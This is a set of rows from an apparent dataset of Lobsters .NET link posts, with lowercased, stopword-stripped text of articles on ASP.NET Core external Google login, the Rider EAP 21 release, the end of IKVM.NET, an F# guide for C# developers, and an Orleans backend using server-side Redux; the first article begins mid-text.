redirecturl defined step controller action redirecturl manual authenticate performed externalcookie provides claimsprincipal user information form google finally signin issued maincookie claimsprincipal new one additional information required sign issued externalcookie cookie get deleted brief overview example used client id client secret callback url briefly mentioned response google contained code really motivated need term form protocol specifically something called authorization code workflow find comprehensive description first step using oauth register client client case web application register external login provider information information required presenting authorization form user display name application know redirect user user accepts reject application requirement oauth requirement known scope example two scope item google profile email application redirects user google includes scope user asked ok web application able access profile email information sum register application external login provider provide least name application callback url eg wwwmydomaincomsigningoogle get return client id client secret client id client secret need enable web application start using external login provider diagram interaction user browser web application external login provider lax terminology actual term authorization server server actually contains user account named resource server might read digitial ocean article oauth need strict description term anyway diagram authorization code grant workflow web application one use important thing note code used one time client secret never go user browser difficult someone impersonate web application would need know client secret need access server aspnet identity use create new project using visual studio select web application membership authorization add authentication middleware external login provider end startup configuration similar public void configure iapplicationbuilder app ihostingenvironment env iloggerfactory loggerfactory appuseidentity appusegoogleauthentication new googleoptions clientid yourclientid clientsecret clientsecret appusemvc route routesmaproute name default template controllerhome actionindex id look source code useidentity extension method find something similar appusecookieauthentication identityoptionscookiesexternalcookie appusecookieauthentication identityoptionscookiestwofactorremembermecookie appusecookieauthentication identityoptionscookiestwofactoruseridcookie appusecookieauthentication identityoptionscookiesapplicationcookie similar setup one described earlier difference two new external authentication middlewares twofactorremembermecookie twofactoruseridcookie scope post order main authentication middleware one automaticauthenticatetrue one use store external login provider authentication result externalcookie swapped work way either order also googleauthentication middleware configured default option default callbackpath new pathstring signingoogle something specific particular external login provider middleware using challenge external login provider performed action named externallogin accountcontroller public iactionresult externallogin string provider string returnurl null var redirecturl urlaction nameof externallogincallback account new returnurl returnurl var property signinmanagerconfigureexternalauthenticationproperties provider redirecturl return challenge property provider look source code configureexternalauthenticationproperties signinmanager would find simply creates instance authenticationproperties way previous example public virtual authenticationproperties configureexternalauthenticationproperties string provider string redirecturl string userid null authenticationproperties authenticationproperties new authenticationproperties redirecturi redirecturl authenticationpropertiesitems loginprovider provider return authenticationproperties item key loginprovider used later highlight appropriate see accountcontroller externallogin action redirecturi set externallogincallback action also accountcontroller let look action removed part relevant public async task iactionresult externallogincallback string returnurl null string remoteerror null var info await signinmanagergetexternallogininfoasync var result await signinmanagerexternalloginsigninasync infologinprovider infoproviderkey ispersistent false resultsucceeded return redirecttolocal returnurl else user account ask user create account viewdata returnurl returnurl viewdata loginprovider infologinprovider var email infoprincipalfindfirstvalue claimtypesemail return view externalloginconfirmation new externalloginconfirmationviewmodel email email first line var info await signinmanagergetexternallogininfoasync trigger authentication external cookie middleware instead instance claimsprincipal return instance externallogininfo class contains following property principal claimsprincipal loginprovider read authenticationproperties item describing challenge mentioned item key loginprovider going used later used providerkey value claim http claimsprincipal think userid external login provider next line var result await signinmanagerexternalloginsigninasync infologinprovider infoproviderkey ispersistent false check record aspnetuserlogins table table link external login provider provider key user id external login provider user aspnetusers table primary key table composite key loginprovider providerkey example record table look like sign google google user id previously associated local user shortly external login externalloginsigninasync issue signin main cookie middleware issue signout external cookie middleware first time though local user record aspnetuserlogins table method simply return signinresultfailed take u externalloginconfirmation page page asked confirm email want use create local account ie record aspnetusers table click register button taken externalloginconfirmation action accountcontroller simplified version public async task iactionresult externalloginconfirmation externalloginconfirmationviewmodel model string returnurl null var info await signinmanagergetexternallogininfoasync var user new applicationuser username modelemail email modelemail await usermanagercreateasync user await usermanageraddloginasync user info await signinmanagersigninasync user ispersistent false return redirecttolocal returnurl first line var info await signinmanagergetexternallogininfoasync line get information stored external cookie return instance externallogininfo exactly done externallogincallback second line var user new applicationuser username modelemail email modelemail line creates new instance aspnet identity user using email entered page user clicked register third line creates new user aspnetusers table await usermanagercreateasync user forth line await usermanageraddloginasync user info line associate newly created user external login provider used mean new record created aspnetuserlogins record table four column loginprovider infologinprovider example google providerkey infoproviderkey example think google user id user signed providerdisplayname used least version aspnet identity finally userid user id newly created user third line finally await signinmanagersigninasync user ispersistent false creates claimsprincipal user issue signin application cookie cookie automaticauthenticate set true mean next request middleware set httpcontextuser user encoded cookie effectivly making user signed notice external cookie never deleted flow big problem since user eventually sign signinmanagersignoutasync called internally issue sign authentication middlewares concludes description using external login provider work aspnet core using authentication middleware using aspnet core identity using aspnet core identity external login provider associate several local user account also possible remove sure shoot foot example removing way user log topic another blog post related
412,Lobsters,dotnet,"C#, F#, .NET programming","Rider EAP 21: F# support, bundled TFS plugin and more",https://blog.jetbrains.com/dotnet/2017/04/27/rider-eap-21-f-support-bundled-tfs-plugin/,rider eap f support bundled tfs plugin,rider eap build available download fixed number bug tfs plugin detection existing file indent editing highlighting xml doc comment added f language support f language support f compiler service initial f support bundled tfs plugin microsoft tfs plugin vcs checkout version control team service version control team service tfs highlighting navigation xml doc comment new improved setting page build execution deployment nuget resharper setting layer added source control editor inspection run inspection name detect use existing file indent editing editor code style download new rider eap,new rider eap build available download rider eap fixed number bug bundled tfs plugin make working tfs vsts easier added detection existing file indent editing added highlighting xml doc comment improved option page inspection nuget client added f language support let go new mean f language support crossplatform net ide felt needed support three major clr language c vbnet f rider eap bundle f plugin built around f compiler service give initial f support initial support mean right feature work f feature still worked building foundation top provide excellent coding navigation refactoring feature work rider open build debug f project f file get syntax highlighting code completion display warning error course rider provides rich navigation even mixed f c project work right quickfixes refactorings number one priority amongst thing debugging work net core fsx file partially supported interactive window crosslanguage navigation requires build navigate f c working inevitable bug future build work progress provide detail f support rider separate blog post next week bundled tfs plugin working microsoft team foundation server tfs visual studio team service vsts great news microsoft tfs plugin come bundled rider startup vcs checkout version control team service menu clone tfs vsts project connecting tfs server vsts rider guide u wizard clone project source code matter tfvc git based connected work tfs vsts repository commit push pull connection managed setting version control team service tfs highlighting navigation xml doc comment code comment help annotate source code describe intended usage structured way using xml doc comment eg param name customer see cref customer contact param xml doc comment make easy generate code sdk documentation rider also make easy read syntax highlighting tooltips information navigation new improved setting page lot work went adding improving various setting page example rider nuget client setting page build execution deployment nuget configure default search behavior install uninstall restore setting dependency behavior set example always install latest patch version available nuget setting stored resharper setting layer shared team member page setting mixed apply intellij idea frontend resharper backend show warning stored different place example r setting stored shared using resharper setting layer whereas intellij idea setting stored idea folder need added source control order shared various frontend backend inspection configured together editor inspection inspection searched making easy configure code style inspection languagespecific inspection c vbnet aspnet html cs le sas regular expression language inspection whether provided intellij idea resharper run run inspection name popup ctrlaltshifti intellij idea inspection also enabled disabled search everywhere popup double shift detect use existing file indent editing probably mentioned best feature checkbox enables something smart case even enable default rider detects existing file indent opening editing source code change setting editor code style needed pretty darn handy rider recognize whether using space space tab another indentation format download new rider eap welcome feedback comment
413,Lobsters,dotnet,"C#, F#, .NET programming",The End of IKVM.NET,http://weblog.ikvm.net/2017/04/21/TheEndOfIKVMNET.aspx,end ikvmnet,,almost fifteen year decided quit working ikvmnet decision long time coming saw yesterday twitter spat please assume cause rather shared underlying cause slowly losing faith net looking back guess process started release net java side thing look much better java module system reminds much generic erasure debacle hope someone fork ikvmnet continue working although appreciate pick another name gotten much criticism name year like hang like thank following people helping make journey making journey much fun brian goetz chris brumme chris laffra dawid wei erik meijer jb evain john rose mads torgersen mark reinhold volker berlin wayne kovsky gnu classpath community mono community want especially thank friend miguel de icaza guidance support inspiration tireless effort promote ikvmthank goodbye
414,Lobsters,dotnet,"C#, F#, .NET programming",A C# Developer’s Guide to F#,http://connelhooley.uk/blog/2017/04/10/f-sharp-guide,c developer guide f,introduction linq action func f skip project visual f power tool github page ionide module function whitespace sensitive let immutable return expression type inference type annotation type annotation may needed later piping generic equality mutability concurrency reasonable fluent apis tuples later unit unit record unit testing expression let expression function signature currying currying curry partial function application partially apply lambda discriminated union union case pattern matching match expression pattern matching exhaustive exhaustive exception try expression collection type pipe operator builder pattern option type throw exception return null return complex type contains success boolean option none,introduction lot information web regarding functional programming f think article aimed modern c developer use linq everyday familiar action func type guide walk basic aspect writing code f point view c developer already familiar aspect functional programming f section purely opinion feel free skip get stuck straight f functional programming gaining traction recent year chance reading article already well aware look feature arriving c recent year see almost available alternative f first c pattern matching basic tuples deconstruction local function c import static type member namespace exception filter c becoming functional every release feel like built upon foundation never designed functional numerous feature baked c language simply make functional programming difficult lack true type inference lack immutability void return type statement instead expression reliance interface inheritance polymorphism opinion c rapid evolution become functional eventually lead fragmentation c world quite foreseeable imagine scenario project written entirely functional manner c using new future c feature new developer accustomed way working join team developer could find code base difficult understand start writing traditional oo code absolutely nothing wrong oop code written one way part written another quite different way reasonability consistency code affected f offer clean line sand oo functional working f codebase know project working going written mostly functional manner perfectly fine write oo code f default way thing le likely revert back way thinking unless suite problem trying solve project let start looking create f project visual studio one important difference f c project know order file solution explorer alphabetical f project actually order compiled file b us function file file b must file notice created b infact b alphabetical order b want use anything move list done via context menu pressing alt updown selected explorer caught quite long time created first f project visual studio tell thing trying use declared yet may sound really horrible experience never caused issue realised going another important thing note folder f project needed code segregated using project solution edit f support folder language adding folder currently unavailable visual studio latest preview version version find claim includes ability f move upmove solution folder node tried preview version still visible obvious way create folder project also tried using add existing item context menu option creating folder f file inside v copy file project folder f project show file button option either also extension give extra f feature called visual f power tool extension support folder described must noted however even maker extension disable folder support default state known issue f project system visual f tool folder organization may work correctly case extension also deprecated stated github page project deprecated functionality ported visual f tool visual studio whilst true f language support folder f tooling visual studio yet probably possible folder development environment like ionide since article aimed existing c developer covering would personally avoid anyway add another layer complexity ordering file module write first function need container put f function put module think module static class difference module static class import module current file like would namespace leaf two tier mechanism organising code f namespaces module container go module function value value type complex type module class interface namespace module class interface namespaces top level tier module lower level tier mentioned previously module imported file exact way namespace f example function called parse module called math math namespace called helper use function import helpersmaths file use parse function add module f project use new context menu option would add class c project somewhat confusingly two f identical option dialogue box appears use first one second one xamarin android file unfortunately resharper user notice included f template new template menu yet function know put function inside ready write function simple add function put inside module namespace namespace helper module math let add let go one line time namespace helper put everything file namespace called helper module math creates module called math see one biggest difference c f f whitespace sensitive notice everything inside module indented due need semicolon curly brace let add declares function declare variable f let keyword used f value immutable using var short variable course make much sense next strange thing noticed line appears three value left equal sign infact single function first value name function called add second value first parameter function called third value second parameter function called body function notice indented compiler know part function declaration line return keyword function body function f single statement expression c equivalent single statement lambda one without curly brace c use return keyword f know way around function f take look program file created u default f console project entrypoint let main argv printfn argv return integer exit code entrypoint f attribute syntax slightly different c square bracket attribute required main method f entry point f important two reason firstly file need module namespace secondly must last file compiled mean bottom project solution explorer let main argv function declaration take command line argument parameter printfn argv writes command line argument console printfn much like consolewriteline combined stringformat worry much mean know print type value find formatting token available printfn function also see syntax calling function f line much like function declaration parameter separated space need comma parenthesis line almost equivalent consolewriteline stringformat argv last line look kind strange return operating system indicate system terminated without error much like using environmentexit method function contain nested function tends scope function f opposed making method public private protected like c let printsignedin username let print consolewriteline datetimenowtoshortdatestring print welcome print successfully username example inner print function available inside printsignedin function indentation used denote content inner function type inference add function previous section take two integer add together return result function however mention int primitive type type matter due powerful feature f called type inference c course type inference example var keyword c infers type assigned variable f type inference hand much advanced compiler take look value used function determine parameter return type function sometimes compiler able infer type happens must use type annotation example function take list call linq extension method called compiler able deduce type take following example let anyitems item itemsany example compile result following error lookup object indeterminate type based information prior program point type annotation may needed prior program point constrain type object may allow lookup resolved type annotation tell compiler type parameter return value like c already following example us type annotation open systemlinq let anyitems item seq string itemsany example imported systemlinq namespace f keyword import namespace module open instead using like c type annotation two part syntax firstly wrap parameter parenthesis place colon inside parenthesis left colon name parameter right colon type parameter way round c type come name also probably wondering seq type seq alias ienumerable short sequence quite sure needed sure lot easier type ienumerable briefly cover collection later member method especially extension method generic type usually break type inference f tend stick lot static function module take type return modified instance finished following pattern result far fewer type annotation cleaner code see action later cover piping generic sometimes actually matter type function parameter return value example take following f code let returnsecondparameter know function pretty useless demonstrates particularly important aspect f since compiler infers type function parameter return type matter function compiled generic function equivalent c code would public returnsecondparameter big difference c go way opt making function generic f however opt make function nongeneric using type annotation leaving generic usually best function need nongeneric open used type equality f use single equal sign comparison opposed double equal find c since value immutable default f much common compare two value assign new value existing value let issumeven let sum sum example let issumeven assigns following function add identifier let sum assigns sum identifier sum compare sum equal equal symbol used immediately let keyword identifier assigns following expression identifier immediately module keyword identifier assigns indented code module expression compare two value also worth noting operator used say equal unlike c mutability f value immutable default assign value identifier f modify functional programming usually desired behaviour number reason make concurrency easier prevents thread changing another thread object make code reasonable value modified code becomes much easier read follow since need keep track change made object function take object know function modify becomes easier make fluent apis read really well scenario however need object mutable one could performance reason array million item may want recreate array item remove one make object mutable f using mutable keyword let mutablevalue let mutable x x x example creates mutable value called x us operator assign new value return new value left arrow used single equal sign used comparison whenever using let module keywords make object mutable really good reason immutability one corner stone functional programming tuples keeping date c aware tuples though tuples ordered group value list integer n integer tuples allow create object contains finite amount different type example could create tuple contains integer string another integer one main us tuples allow return multiple value function without create small poco class contain f tuples written using parenthesis item inside separated comma example function return tuple contains integer string let addten num original value num example return value ten added tuple first item string containing value tuple second item tuples also unpacked deconstructed assigned example tuples assigned let result message addten example result contains integer first item tuple message contains string second item tuple unpacking tuples optional always unpack tuple later demonstrated following example let resultandmessage addten let result message resultandmessage see using tuples convenient way returning multiple value function without create small type extracting value also another purpose f cover later unit mentioned previously function f expression function return void used expression example use function return void ternary expression c demonstrate point following c code compile class program static void main string args argslength consolewriteline hello consolewriteline world expression must return type f special type called unit unit empty value anything unit type since actual value unlike void absence value use expression method return void c threadsleep consolewriteline return unit used f unit expressed f using two bracket next like could described empty tuple example entirely pointless function take unit return unit want disregard returned value function return unit instead f function called ignore example consolereadline return string want function return unit use ignore function ignore string returned readline method return unit instead let waituntilenter ignore consolereadline waituntilenter function return empty unit type rather string returned readline method record record immutable poco class offer value based equality free opposed reference based equality get default c example record declaration type person name string age int instantiate record following syntax used let person name connel age f compiler infers type u look available type type name age property since one compiler successfully infer type object person type example f type inference head shoulder c two record property use type annotation tell compiler one use although rare two record exact property probably merge since record class placed inside namespace module one best feature record compared example take following f code open system type person name string age int entrypoint let main argv let name connel age let name hooley age let name connel age let let consolewriteline print false consolewriteline print true consolewriteline press enter exit let value consolereadline return integer exit code example main method creates person record first second person record different name whereas first third record property notice comparing result true printed record check equality comparing property perform reference comparison like c really useful unit testing mean waste time writing equal implementation actual perform valid comparison majority time care value object equal reference thing note record contains another record comparison crawl object shallow comparison record contains list every item list compared ensure list contain item result performance drop mindful checking two complex record equal new keyword never required f semicolon used previous example create record one line expression f ternary operator since everything already expression f f equivalent c ternary operator expression using expression branch expression must return type example module helper let isconnel x x connel value connel else value connel like everything f expression whitespace sensitive need curly brace semi colon main difference compared c need parenthesis around condition additional keyword required part expression return string else branch returned boolean example code would compile let expression c possible declare variable expression combat f let expression seen let expression action quite time already worth exploring work let expression work binding result expression identifier used next expression let identifier bindingexpression usageexpression think let expression syntactical sugar following function c public static void bind func bindingexpression action usageexpression usageexpression bindingexpression therefore f code let let b let c b consolewriteline c equates c code bind assign value bind b assign value b bind b c assign b c consolewriteline c function signature c method signature look like see included return type curious int add int int wanted take method followed notation parameter would need take object type func int int int f notation method signature add function following signature f int int int f signature appears closely resemble corresponding func type c item far right return type item left value need put get return type one f nice feature function signature also type two different thing like c asterisk used denote tuples following example signature function take integer return tuple integer first item string second item int int string take following f function let doublewhentrue num predicate predicate num num else num example function take another function parameter notiontype function int int bool int parenthesis used indicate nested function parameter parenthesis also used indicate function returned take following f function let add let sum let returnfunction num sum num returnfunction example function take two integer add together return another function take another int add sum previous two integer return result notiontype function int int int int please note would never usually write function like would instead use currying currying one powerful feature f differentiates c builtin currying currying split single function n parameter n separate function example take following c function type func int int int int calling function type would look like int sum addthreenumbers curry would end function following function type func int func int func int int calling function would look like int sum addthreenumberscurried generic function type pretty confusing long major reason f functional programming general lean heavily type inference f function curried default example take following f function let addtwonumbers function take two parameter add together f actually call function one parameter since function curried return function take single integer return integer let addten addtwonumbers let twelve addten let fifteen addten calling function without parameter called partial function application due f built currying possible overload function f example following interface perfectly valid c public interface imathshelpers int add int int add int int c compiler know provide one integer call first method provide two call second method f however compiler would know whether wanted call first method partially apply second method want prevent function partially applied group together input tuple since tuple single value must give item inside tuple time example take following f method let addtwonumberstuple function take single tuple parameter instead taking two separate integer value signature function int int int see one arrow function type signature arrow indicates function type partially applied following would compile need provide entire tuple let addfive addtwonumberstuple method overload c type still available f function created outside f net exposed f project function single tuple input mean partially apply function created outside f example stringformat following overloaded signature partially applying function also used form dependency management take following c example public interface ibookingsystem bool isroomavailable int hotelid datetime datetime string getbooking int hotelid datetime datetime public interface iemailer bool emailbooking string emailaddress string bookingid public class hotel private readonly ibookingsystem bookingsystem private readonly iemailer emailer private readonly int hotelid public hotel ibookingsystem bookingsystem iemailer emailer int hotelid bookingsystem bookingsystem emailer emailer hotelid hotelid public bool bookroom string emailaddress datetime datetime bookingsystemisroomavailable hotelid datetime string bookingid bookingsystemgetbooking hotelid datetime emaileremailbooking emailaddress bookingid return true else return false hotel class take three dependency constructor take another two item book room method f would become one function like module hotel open system let bookroom isroomavailable int datetime bool getbooking int datetime string emailbooking string string unit hotelid int emailaddress string datetime datetime isroomavailable hotelid datetime let bookingid getbooking hotelid datetime emailbooking emailaddress bookingid true else false added type annotation function parameter see type although necessary could removed make easier read instead injecting interface class constructor pas dependant function function first parameter mean partially apply function like let createbooking hotelbookroom bookingsystemisroomavailable bookingsystemgetbooking emailemailbooking line call hotelbookroom function provide parameter leaf u function following signature string datetime bool bookroom method hotel class c code signature partially applying function result code still perfectly testable testing hotelbookroom function pas fake implementation dependency example want test happens hotelbookroom function isroomavailable return false pas function always return false mean get fully unit testable code without following overhead creating interface every class mocked need mocking framework need ioc framework bind interface concrete implementation lambda obviously f support lambda function take another function parameter pas lambda rather using let expression create function passing let doublewhentrue num predicate predicate num num else num let x doublewhentrue fun lambda fun lambda wrapped parenthesis start fun keyword use skinny arrow rather fat arrow like c discriminated union c want function take one several type use polymorphism method overload covered method overload available f function record tuples support inheritance f discriminated union tend used instead discriminated union type like enum type instance discriminated union one type enum example discriminated union type state error exception info string warning int string instance state type error info warning identifier called union case example error union case exception info union case string warning union case tuple contains integer string following three function return state type let createerror error exception let createinfo info example info text let createwarning warning example warning text see union case constructor must put value union case union case also empty used like much like enum type state error info warning let createerror error let createinfo info let createwarning warning whereas inheritance c offer flexibility tree like structure object inherit property parent discriminated union offer flat structure object share property parent discriminated union combined pattern matching form common way managing flow control f application match expression pattern matching match expression pattern matching massive topic right scratching surface match expression thought powerful switch statement example match expression type state error exception info string warning int string let getstatemessage state match state error ex error message exmessage info message info message message warning num message warning message message function take state discriminated union performs pattern matching state error union case run following expression error message exmessage state info union case run following expression info message message state warning union case run following expression warning message message like expression match expression must return type branch example three branch match expression must return string one tried return integer code would compile match expression unpacks deconstructs union case match look error branch error ex error message exmessage see expression ran access exception inside error union case match expression exhaustive mean matter value particular type given expression always branch match value match statement perform pattern matching type discriminated union shown following example let matchnumbers x match x given function take integer performs pattern matching x match value string returned integer however runtime exception thrown match expression exhaustive function actually generates compile time warning incomplete pattern match expression example value may indicate case covered pattern compiler even give example value match match expression concept similar default statement found c switch statement underscore wildcard f match object following example exhaustive let matchnumbers x match x given given also use conditional expression match certain type certain condition true following example demonstrates let processage age match age age age child age age age oap age age adult age see keyword used add condition branch example age age match age example also demonstrates branch match value whilst still using value branch expression match underscore wildcard access value matched expression right arrow match value simply give value name branch age adult age match integer give name age age available expression right arrow since match expression therefore return value would make sense match expression branch fall matched expression expression ran first one match therefore order branch important f equivalent break keyword found c switch statement exception exception f like discriminated union single union case example f exception type whose content tuple contains string first item record second item exception invalidperson string person throw exception raise keyword used exception invalidname string exception invalidage int let validate person personname connel raise invalidname personname else personage raise invalidage personage else person raise keyword also throw net exception created outside f let validate person personname connel personage raise invalidoperationexception try expression try expression used f catch thrown exception similar syntax match expression exception invalidname string exception invalidage int let validate person personname connel raise invalidname personname else personage raise invalidage personage let print person try validate person consolewriteline person valid invalidname name consolewriteline person named connel person named name invalidage age consolewriteline person person agetostring year old pattern matching work nicely exception created outside f match none f exception use operator check type object f equivalent keyword c let divide try dividebyzeroexception collection type f three main collection type seq alias ienumerable therefore lazy loaded create seq must use syntax seen must type seq followed curly brace inside curly brace write expression return sequence let numbersseq seq yield yield yield yield yield use yield keyword inside curly brace seq expression using ienumerables c rarely create instead use helper method like ienumerablerange f different let doublenumber let numbersseq seqinit doublenumber example creates sequence five number long produce sequence number five number doubled list eagerly loaded linked list c list type create list use squared bracket let numberslist want list written one line use semicolon delimiter like otherwise use new line instead array traditional c array exact syntax f list extra pipe character let numbersarray three type also corresponding module expose function use type lot function offer functionality linq extension method c different name table comparing name f function corresponding c linq function map select filter collect selectmany fold aggregate find first following f code let item let doubleditems listmap fun item let evenitems listfilter fun doubleditems equates following c code var item new var doubleditems itemsselect var evenitems doubleditemswhere pipe operator c fluent apis becoming popular fluent apis read really well chain method call together without needing declare several local variable also appealing read left right read much like actual language c extension method builder pattern become way fluent apis tend implemented problem builder pattern approach spend time design write lot additional code additional code need tested extension method like found linq also require write code particular way f however allows write fluent apis almost effort make sure subject function last parameter use pipe operator chain method call together pipe operator typed simple pipe operator simply following function take item function take item put parameter function stringisnullorempty connel becomes connel stringisnullorempty swapping order item immediately make function read left right like actual language use pipe operator partially applied function result fluent api let filterlist item item seqmap fun seqfilter fun example take sequence pipe sequence mapping function seqmap f equivalent select extension method linq take two parameter first function performed item sequence second sequence call seqmap fun supply sequence final parameter result partially applied function take sequence exact signature need pipe operator work function f take main parameter last rather first seen c option type f type null following example compile type person name string age int let person name connel age let person null example us let expression type annotation mean provide type inferred compiler used type annotation assigning null value compiler obviously able infer type much like var x null c bottom line example result following compiler error type person null proper value give peace mind using f value null check want represent lack value imagine personrepository find function search database person record match particular name person matching name found c would option throw exception linq first method work exception thrown something exceptional happens prevents application carrying example query database name exactly exceptional circumstance could number perfectly good reason match return null linq firstordefault method work function sometimes return null deemed dishonest signature fully describe behaviour unless look documentation firstordefault clear return null match also go without saying null evil litter code null check dreaded object set reference object runtime error return complex type contains success boolean property property actual result regexmatch function work result additional overhead creating wrapper object instead lot null check lot success check also something hacky property populated success boolean true forget check success boolean could still get null reference exception f different mechanism representing object may may value called option type simply discriminated union represents either value none value following example match regex expression module regexhelpers open systemtextregularexpressions let regexmatch pattern input match regexmatch input pattern regexmatch regexmatchsuccess regexmatchvalue none signature function string string string option string option another way writing option string instead throwing exception null return discriminated union could either value empty value immediately see consume function purely signature function consumes value use pattern matching either extract result union case something none union case open system open systemtextregularexpressions let regexmatch pattern input match regexmatch input pattern regexmatch regexmatchsuccess regexmatchvalue none let getage input match regexmatch input value value none age unknown let connelage getage connel let bobage getage bob na example connelage equal bob equal age unknown consuming option type force u cater successful match unsuccessful match way get inner value discriminated union pattern match exhaustive match expression compiler tell u impossible access value inside option type impossible get runtime exception accessing accidentally
416,Lobsters,dotnet,"C#, F#, .NET programming","Building a realtime server backend using the Orleans Actor system, Dotnet Core and Server-side…",https://medium.com/@MaartenSikkema/using-dotnet-core-orleans-redux-and-websockets-to-build-a-scalable-realtime-back-end-cd0b65ec6b4d,building realtime server backend using orleans actor system dotnet core,building realtime server backend using orleans actor system dotnet core serverside redux radically different web server architecture turned twenty year experience building website upside microsoft orleans distributed virtual actor system actor model microsoft orleans basic progressed steadily idistributedcache big deal reduxnet previous post rrod reduxnet eventsourcing package custom storage logic reduxoffline swprecache serverside redux actor web api generated c server code typewriter previous post clientside javascript one typescript working clientside websockets dotnet core built websocket manager radu matei testing http typewriter addin orleans reminder limitation builtin actor indexing distributed transactional actor solution,building realtime server backend using orleans actor system dotnet core serverside reduxa radically different web server architecture turned twenty year experience building website upside downmicrosoft orleans market straightforward approach building distributed highscale application net orleans offer improved actor model make possible architect application radically new way still undiscovered developersthis third final part series exploration modern web application architecture rrod react redux orleans dotnet core introduction see heremicrosoft orleans distributed virtual actor systemi worked microsoft orleans two year taken quite time understand use never want go back traditional web server architecture built first databasedriven website helped build many year lot knowledge built year consider deprecated actor system turn traditional web server architecture completely upside instead getting data webserver executing logic distributed actor system execute logic data actor system make sure every data element actor object life one place one machine cluster duplication data simplifies thing dramatically actor object run single thread simplifying thing even finally actor call notify actor object change effectively pushing data graph actor object useronce understand actor system work whole idea gobbling data together render page webserver executing database query mapping object caching data dealing conflict caused data duplication locking every web request seems cumbersome web server awful lot complex data manipulation avoided completely using actor modelactor grain original microsoft orleans developer opted overload term actor implementation deliberately different original actor model definition probably wanted avoid academic turf war orleans us term grain indicate virtual actor use term interchangeablymicrosoft orleans basicsthis project modern application architecture based dotnet core microsoft orleans large codebase used running big project inside outside microsoft current version run net framework make heavy use binary serialization us window api manage memory cpu load make nontrivial create crossplatform dotnet core version people working orleans project capable work dotnet corecompatible version progressed steadily second prerelease came recently using preview version projectsetting solution use microsoft orleans requires project structure consisting minimum four project orleanshost project buids executable start orleans runtime silo hosting grain object start multiple host start working together share loadwebapp web server application project project connects client orleanshost process e tcpgraininterfaces project contains interface definition grain referenced orleanshost webappgrains project contains implementation code grain deployed orleanshostduring development orleanshost webapp process simply started debugged together developer machine production usually run separately cluster consisting multiple machine offering reliability distributed resource management course small application could still run single machine without reliability still benefiting realtime architecture high performancein introduction said want bothered caching anymore however several aspnet core library need distributed cache scaleout architecture normally use redis cache implementation provided default illustration one use orleans complete distributed cache implementation dotnet core using orleans instead redis graininterface class declares four function needed implement cache get set clear refresh grain implementation wrap cachedata immutable performance optimization avoid copying keep reference member variablethe orleanscache class implement idistributedcache interface dotnet core defines us grainfactorygrainclientgetgrain icachegrain byte key get reference cachegrain identified cache key store retrieves data byte array grain generic type directly use byte array cachegrain registering cache service startup calling servicesaddsingleton idistributedcache orleanscache get fully scalable production ready distributed cache dotnet service session state automatically usethis kind code easy understand trivial debug need install manage redis think redundancy manage extra connection string learn another api learn another query language cache need smarter built technology stackno big deal ok know crud style actor orleans almost using database building entity framework micro orm actor offer performance scalability advantage using way brings nothing revolutionarythe fun part begin realize data layer logic program c f make talk back start thinking pattern enables hope see made big claim introduction using stateful object observable stream backend enables architecture different datadriven requestresponse based architecture used toreduxnetas wrote previous post rrod thought redux javascript technology cool started wonder would possible use server well redux actually pretty simple idea look lot like event sourcing implementing net hard indeed turn redux combine really well actor modelthere reduxnet library nuget mainly aimed toward building application user interface base implementation redux line code used code implement reduxstyle event sourcing grain object orleans also official orleans eventsourcing package currently useful lack storage support reduxgrain wrote custom storage logic using azure table storage fast reliable inexpensive also default storage mechanism orleans us normal stateful grainsthe advantage hope architecture deliver easily build realtime user interface user automatically receives updated data happens user multiple browser device open see data every deviceuse hardware resource efficiently make hosting cost scale linearly instead exponentially number usersthe general benefit come event sourcing architecture domain modelling testing auditing traceability storagesharing code pattern server javascript client native net xamarin appsmake easier implement offline client using javascript service worker xamaringetting reduxstyle timetravel dotnet server using editandcontinue immediate windowi think project mostly achieves benefit work needed make work offline add reduxoffline swprecache also editandcontinue dotnet handle limited code change meaningful change often require application restartserverside redux actori exploring clientside serverside technology together find orleans based backend could work together modern javascript frontend created serverside version counter sample often used demonstrate redux demo simply increment decrement integer value dispatching redux action displaying current state version following addition button clicked clientside asyncaction kicked dispatch action clientside updating view also post request update state server using web api callthe web server receives request get reference countergrain object identified web session id orleans server call equivalent method therethe countergrain subclassed reduxgrain common base class grain project us azure storage table store every redux action ever got activation grain stream replayed get current state new action processed added storedthe user refresh browser anytime happens page rendered serverside using current state grain orleans keep grain memory activated two hour default orleans runtime decides need free memory mean reloading data client result database hit server grain memory already always latest stateupdates initial page render happen clientside using react based componentthe server initiate update time complex scenario another user might cause update simulate added start stop button operate serverside timer managed orleans started server increment counter every secondswhen timer tick happens incrementcounter action generated server processed generating dispatching action store saving storage grain activation registered subscription store publish new state orleans stream actionstoclient every client keep open websocket subscribes server update session corresponding sockethandler web server subscribes orleans stream actionstocient id session action published stream orleans grain get passed websocket dispatched clientside redux state resulting automatic update viewhere schematic overview flow look like user web apibelow snippet asyncaction get called user click increment button note adding header protect crosssite scripting someone better javascript would intercept call add header automagically code also show modern javascript syntax using async fetch reference typescript interface string constant generated c server code typewriter server import discussed previous post clientside javascriptthe mvc controller receives incrementcounter request get reference counter grain current session call corresponding method awaiting resultthe redux reducer process action serverside c almost one typescript working clientside process action return new resulting statethe reduxgrain baseclass take reducer function constructor parameter together injected storage handler correct state type implement dispatch writestateasync functionsthe dispatch method take action update state using reducer writestateasync function functionally equivalent normal stateful grain store data orleans make easy change normal orleans grain event sourcing grain reduxgrain implement version writestateasync appends internal list unsaved action azure storage table using partitionkey based grain id rowkey based timestampthe method inside countergrain equivalent asyncaction javascript redux dispatch executes reducer pure function without side effect grain method dispatch action execute sideeffects saving storage publishing event stream starting timer architecture could taken even moving method another type sagagrain would manage long processesin startcounter case start orleans timer registered method triggered every secondsif look source code rrod project might notice experimented different way sending action browser web server orleans server using websockets web api using orleans stream direct rpc passing command object generic process method using separate web api call typed data method work eventually settled using plain web api call going client server controller method forward request calling corresponding interface method orleans grain await promise javascript resolve web api fully processed orleans grain make easy handle errorsdata flowing back server client us action message flow websocket connection opened client start flow made fully asynchronous using orleans stream making secondary message asynchronous orleans avoids deadlock scenario otherwise happen easily actor systemswebsockets dotnet corei used signalr past great success wanted use however crossplatform aspnetcore version signalr available yet currently built aspnetcore team first tried use prerelease version could get work together currently released version dotnet core found websocket manager middleware aspnet core radu matei worked went fallback browser support websockets somewhat lowlevel work well enough passing simple json object signalr becomes available easily replace current codetesting itas previous installment series play clone http open visual studio run orleanshost webapp project start azure storage emulator first alternatively linux osx could use v code run dotnet restore dotnet build dotnet run project azure storage emulator windowsonly may also need create configure real azure storage connection appsettingsconfig file automatic typescript model generation c model work v install typewriter addin change model class see working generated typescript file checkedin use visual studio still run project synchronize javascript c model manually change something themthe resulting counter page work designed update 